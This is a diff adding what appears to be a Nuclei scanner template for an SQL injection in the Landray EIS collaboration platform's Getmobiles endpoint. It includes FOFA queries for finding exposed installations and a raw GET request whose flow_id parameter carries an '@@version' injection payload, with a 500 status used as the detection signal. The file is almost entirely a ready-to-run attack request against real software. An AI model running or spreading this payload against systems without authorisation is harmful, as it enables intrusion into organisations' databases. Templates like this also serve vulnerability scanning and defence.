@@ -1,0 +1,23 @@
+id: poc-ywmi8aefiihfba2t
+info:
+  name: 蓝凌EIS智慧协同平台 Getmobiles 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ywmi8aefiihfba2t'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ywmi8aefiihfba2t
+    fofa: body="/sc ripts/jquery.landray.common.js" || body="v11_QRcodeBar clr" || title="智慧协同平台"&& body="欢迎登录智慧协同平台"
+http:
+- raw:
+  - 'GET /Mobile/mobile_define.aspx/Getmobiles?flow_id=1%20and%201=@@version--+ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
